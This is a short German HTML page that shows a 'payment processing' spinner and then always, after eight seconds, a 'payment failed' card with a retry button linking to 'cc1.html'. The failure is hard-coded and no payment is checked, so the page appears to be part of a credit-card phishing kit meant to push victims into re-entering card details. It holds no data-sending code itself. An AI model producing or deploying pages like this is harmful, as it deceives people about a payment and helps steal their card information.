<!doctype html>
<html lang="de">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Zahlung wird verarbeitet</title>

  <style>
    :root {
      --purple:#4B32E3;
      --text:#111827;
      --muted:#6B7280;
      --panel:#F9FAFB;
      --danger:#DC2626;
      --radius:14px;
      --font:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial;
    }

    * { box-sizing: border-box; }

    body {
      margin: 0;
      font-family: var(--font);
      background: var(--panel);
      color: var(--text);
      min-height: 100vh;
      display: grid;
      place-items: center;
      padding: 24px;
    }

    /* Loader */
    .loader {
      text-align: center;
    }

    .spinner {
      width: 48px;
      height: 48px;
      border-radius: 50%;
      border: 4px solid #E5E7EB;
      border-top-color: var(--purple);
      animation: spin 1s linear infinite;
      margin: 0 auto 18px;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .loader p {
      color: var(--muted);
      font-size: 15px;
    }

    /* Card (initial hidden) */
    .card {
      display: none;
      background: #fff;
      border-radius: var(--radius);
      box-shadow: 0 10px 30px rgba(0,0,0,.08);
      max-width: 480px;
      width: 100%;
      padding: 32px;
      text-align: center;
    }

    .icon {
      width: 64px;
      height: 64px;
      border-radius: 50%;
      background: rgba(220,38,38,.1);
      color: var(--danger);
      display: grid;
      place-items: center;
      font-size: 32px;
      margin: 0 auto 16px;
    }

    h1 {
      margin: 0 0 8px;
      font-size: 24px;
    }

    p {
      margin: 0 0 18px;
      color: var(--muted);
      font-size: 15px;
      line-height: 1.5;
    }

    .hint {
      background: #FEE2E2;
      color: #7F1D1D;
      border-radius: 10px;
      padding: 12px 14px;
      font-size: 14px;
      margin-bottom: 24px;
    }

    .btn {
      height: 52px;
      border-radius: 12px;
      font-size: 16px;
      font-weight: 800;
      border: none;
      cursor: pointer;
      text-decoration: none;
      display: flex;
      align-items: center;
      justify-content: center;
      background: var(--purple);
      color: #fff;
      width: 100%;
    }
  </style>
</head>

<body>

  <!-- Ladeansicht -->
  <div id="loader" class="loader">
    <div class="spinner"></div>
    <p>Zahlung wird verarbeitet…</p>
  </div>

  <!-- Fehlerkarte -->
  <div id="errorCard" class="card">
    <div class="icon">!</div>

    <h1>Zahlung fehlgeschlagen</h1>

    <p>
      Leider konnte deine Zahlung nicht abgeschlossen werden.
      Bitte überprüfe deine Eingaben und versuche es erneut.
    </p>

    <div class="hint">
      Es wurde keine Zahlung durchgeführt.
    </div>

    <a href="cc1.html" class="btn">
      Erneut versuchen
    </a>
  </div>

  <script>
    // Nach 8 Sekunden Loader ausblenden & Fehler anzeigen
    setTimeout(() => {
      document.getElementById("loader").style.display = "none";
      document.getElementById("errorCard").style.display = "block";
    }, 8000);
  </script>

</body>
</html>
